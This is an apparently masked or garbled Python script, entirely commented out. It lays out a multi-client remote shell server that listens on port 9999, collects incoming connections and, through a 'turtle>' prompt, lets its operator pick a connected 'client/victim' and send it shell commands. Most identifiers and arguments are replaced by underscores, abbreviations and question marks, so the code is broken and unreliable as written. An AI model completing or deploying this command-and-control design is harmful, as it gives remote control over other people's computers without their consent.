# ______ so..
# ______ ___
# ______ th..
# ______ t__
# ____ q.. ______ Q..
#
# NUMBER_OF_THREADS _ 2
# JOB_NUMBER _ [1, 2]
# queue _ Queue
# all_connections _   # list
# all_address _   # list
#
#
# # Create a Socket ( connect two computers)
# ___ create_socket
#     ___
#         g.. h..
#         g.. p..
#         g.. s
#         h.. _ ""
#         p.. _ 9999
#         s _ ?.?
#
#     ______ ?.e.. __ msg
#         print("Socket creation error: " + st. ?
#
#
# # Binding the socket and listening for connections
# ___ b.._s..
#     ___
#         g.. h..
#         g.. p..
#         g.. s
#         print("Binding the Port: " + st. ?
#
#         s.b.. ? ?
#         s.l.. 5
#
#     ______ ?.e.. __ msg
#         print("Socket Binding error" + st. ? + "\n" + "Retrying...")
#         b.._s..
#
#
# # Handling connection from multiple clients and saving to a list
# # Closing previous connections when server.py file is restarted
#
# ___ accepting_connections
#     ___ c __ a_c..
#         c.c..
#
#     d.. a_c.. ;
#     d.. a_a.. ;
#
#     w__ T..
#         ___
#             conn, address _ s.a..
#             s.s_b.. 1  # prevents timeout
#
#             a_c_.ap.. ?
#             a_a_.ap.. ?
#
#             print("Connection has been established :" + a.. 0
#
#         ______
#             print("Error accepting connections")
#
#
# # 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# # Interactive prompt for sending commands
# # turtle> list
# # 0 Friend-A Port
# # 1 Friend-B Port
# # 2 Friend-C Port
# # turtle> select 1
# # 192.168.0.112> dir
#
#
# ___ start_turtle
#
#     w__ T..
#         cmd _ in__('turtle> ')
#         __ ? __ 'list':
#             l_c..
#         ____ 'select' __ ?
#             conn _ g_t.. ?
#             __ ? _ no. N..
#                 s.._t.._c.. ?
#
#         ____
#             print("Command not recognized")
#
#
# # Display all current active connections with client
#
# ___ list_connections
#     results _ ''
#
#     ___ i, conn __ en.. a_c..
#         ___
#             ?.s.. st..en.. ' '
#             ?.r.. 20480
#         ______
#             de. a_c.. ?
#             de. a_a.. ?
#             c..
#
#         results _ st. ? + "   " + st. a_a.. ? 0 + "   " + st. a_a.. ? 1 + "\n"
#
#     print("----Clients----" + "\n" + ?
#
#
# # Selecting the target
# ___ get_target cmd
#     ___
#         target _ ?.r..('select ', '')  # target = id
#         target _ in. ?
#         conn _ a_c.. ?
#         print("You are now connected to :" + st. a_a.. t.. 0
#         print st. a_a.. t.. 0 + ">", e.._""
#         r_ ?
#         # 192.168.0.4> dir
#
#     ______:
#         print("Selection not valid")
#         r_ N..
#
#
# # Send commands to client/victim or a friend
# ___ s.._target_commands conn
#     w__ T..
#         ___
#             cmd _ in__
#             __ ? __ 'quit'
#                 b..
#             __ le. st..en.. ? > 0
#                 ?.s.. st..en.. ?
#                 client_response _ st. ?.r.. 20480 "utf-8"
#                 print ? e.._""
#         ______:
#             print("Error sending commands")
#             b..
#
#
# # Create worker threads
# ___ create_workers
#     ___ _ __ ra.. N..
#         t _ ?.T.. t_w..
#         ?.d.. _ T..
#         ?.s..
#
#
# # Do next job that is in the queue (handle connections, send commands)
# ___ work
#     w__ T..
#         x _ q__.g..
#         __ x __ 1
#             c_s..
#             b.._s..
#             a..
#         __ x __ 2
#             s_t..
#
#         q_.t_d.
#
#
# ___ create_jobs
#     ___ x __ J..
#         q__.p.. ?
#
#     q__.j..
#
#
# c_w..
# c_j..